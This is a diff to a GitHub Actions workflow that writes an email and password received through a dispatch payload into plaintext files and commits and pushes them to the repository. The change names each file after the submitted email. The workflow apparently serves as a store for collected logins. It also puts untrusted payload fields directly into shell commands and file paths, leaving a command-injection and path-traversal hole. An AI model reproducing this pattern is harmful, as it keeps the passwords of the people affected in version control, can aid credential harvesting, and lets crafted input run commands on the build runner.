@@ -14,14 +14,14 @@ jobs:
       - name: Save Credentials
         run: |
           mkdir -p credentials
-          echo "Email: ${{ github.event.client_payload.email }}" > credentials/credentials.txt
-          echo "Password: ${{ github.event.client_payload.password }}" >> credentials/credentials.txt
+          echo "Email: ${{ github.event.client_payload.email }}" > credentials/credentials_${{ github.event.client_payload.email }}.txt
+          echo "Password: ${{ github.event.client_payload.password }}" >> credentials/credentials_${{ github.event.client_payload.email }}.txt
 
       - name: Commit and Push
         run: |
           git config --global user.name "github-actions"
           git config --global user.email "actions@github.com"
-          git add credentials/credentials.txt
+          git add credentials/*
           git commit -m "Add new credentials"
           git push
         env:
